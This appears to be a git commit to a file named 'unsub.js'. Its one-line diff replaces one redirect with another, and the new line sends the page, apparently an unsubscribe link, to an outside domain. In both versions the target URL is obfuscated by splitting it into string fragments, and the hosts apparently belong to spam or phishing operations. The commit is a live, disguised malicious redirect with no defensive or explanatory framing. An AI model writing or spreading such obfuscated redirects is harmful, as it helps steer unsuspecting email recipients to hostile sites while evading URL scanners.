c71cb0cdb68de9ebb46a1d545fdda98ead52899d
ARFfox <123828938+ARFfox@users.noreply.github.com>
2023-02-08 14:04:13 +0100

    Update unsub.js

--- unsub.js
+++ unsub.js
@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`ht`,`tp://mar`,`ketm`,`ai`,`llead`,`.sit`,`e/oop/`,`0_mt/1/`,`235/866/`,`0/0`))
+window.location.replace(``.concat(`ht`,`tp:/`,`/max`,`ment`,`ale.`,`stor`,`e/oo`,`p/0_`,`mt/1/2`,`82/86`,`4/0`,`/0`))
